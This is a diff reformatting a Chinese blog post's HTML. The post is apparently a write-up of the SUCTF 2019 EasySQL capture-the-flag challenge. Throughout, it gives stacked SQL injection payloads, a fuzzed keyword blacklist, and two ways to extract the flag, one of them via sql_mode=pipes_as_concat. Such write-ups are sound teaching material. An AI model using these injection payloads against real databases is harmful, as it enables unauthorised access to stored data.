@@ -61,33 +61,44 @@
   
 
   <div class="post-content">
-    <p>suctf2019的一道sql注入<br>buuoj上的环境：<a href="https://buuoj.cn/challenges#[SUCTF%202019]EasySQL" target="_blank" rel="noopener">https://buuoj.cn/challenges#[SUCTF%202019]EasySQL</a></p>
+    <p>suctf2019的一道sql注入<br>
+buuoj上的环境：<a href="https://buuoj.cn/challenges#%5BSUCTF%202019%5DEasySQL" target="_blank" rel="noopener">https://buuoj.cn/challenges#[SUCTF 2019]EasySQL</a></p>
 <p>题目说</p>
 <blockquote>
-<p>Give me your flag, I will tell you if the flag is right. </p>
+<p>Give me your flag, I will tell you if the flag is right.</p>
 </blockquote>
 <p>可以发现一些东西：</p>
 <ul>
 <li>输入除0外任何数字，返回Array ( [0] =&gt; 1 ) ，0返回空</li>
 <li>输入中带有字母，返回空</li>
-<li>存在堆叠注入<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query=1;<span class="keyword">show</span> <span class="keyword">tables</span>;</span><br></pre></td></tr></table></figure>
-返回<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Array ( [0] &#x3D;&gt; 1 ) Array ( [0] &#x3D;&gt; Flag )</span><br></pre></td></tr></table></figure>
-可以看到当前库只有一个Flag表</li>
+<li>存在堆叠注入</li>
 </ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query=1;<span class="keyword">show</span> <span class="keyword">tables</span>;</span><br></pre></td></tr></table></figure>
+<p>返回</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Array ( [0] &#x3D;&gt; 1 ) Array ( [0] &#x3D;&gt; Flag )</span><br></pre></td></tr></table></figure>
+<p>可以看到当前库只有一个Flag表</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query=1;<span class="keyword">select</span> * <span class="keyword">from</span> Flag;</span><br></pre></td></tr></table></figure>
-<p>返回Nonono.<br>可以想到是一些关键字被过滤了<br>fuzz可以发现过滤的关键字</p>
+<p>返回Nonono.<br>
+可以想到是一些关键字被过滤了<br>
+fuzz可以发现过滤的关键字</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\&quot;</span><br></pre></td></tr></table></figure>
-<p>from被过滤了，所以不能用之前强网杯预处理的方法(<a href="https://liotree.github.io/2019/08/13/%E9%9A%8F%E4%BE%BF%E6%B3%A8/">https://liotree.github.io/2019/08/13/%E9%9A%8F%E4%BE%BF%E6%B3%A8/</a>)</p>
+<p>from被过滤了，所以不能用之前强网杯预处理的方法(<a href="https://liotree.github.io/2019/08/13/%E9%9A%8F%E4%BE%BF%E6%B3%A8/">https://liotree.github.io/2019/08/13/随便注/</a>)</p>
 <p>这时候可以通过前面的输入输出</p>
 <ul>
 <li>输入除0外任何数字，返回Array ( [0] =&gt; 1 ) ，0返回空</li>
-<li>输入中带有字母，返回空<br>去猜想后端的sql语句<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> $<span class="keyword">query</span>||flag <span class="keyword">from</span> Flag;</span><br></pre></td></tr></table></figure>
-拿flag有两个方法</li>
-<li>直接构造<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> *,<span class="number">1</span>||flag <span class="keyword">from</span> Flag;</span><br></pre></td></tr></table></figure></li>
-<li>mysql存在一个sql_mode,将其设为PIPE_AS_CONCAT可以将||的作用变为拼接字符串,详细可以参见<a href="https://www.cnblogs.com/mke2fs/p/11405531.html" target="_blank" rel="noopener">https://www.cnblogs.com/mke2fs/p/11405531.html</a><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query=1;<span class="keyword">set</span> sql_mode=pipes_as_concat;<span class="keyword">select</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
-
-</li>
+<li>输入中带有字母，返回空<br>
+去猜想后端的sql语句</li>
 </ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> $<span class="keyword">query</span>||flag <span class="keyword">from</span> Flag;</span><br></pre></td></tr></table></figure>
+<p>拿flag有两个方法</p>
+<ul>
+<li>直接构造</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> *,<span class="number">1</span>||flag <span class="keyword">from</span> Flag;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>mysql存在一个sql_mode,将其设为PIPE_AS_CONCAT可以将||的作用变为拼接字符串,详细可以参见<a href="https://www.cnblogs.com/mke2fs/p/11405531.html" target="_blank" rel="noopener">https://www.cnblogs.com/mke2fs/p/11405531.html</a></li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query=1;<span class="keyword">set</span> sql_mode=pipes_as_concat;<span class="keyword">select</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
 
   </div>
   <div class="post-meta">
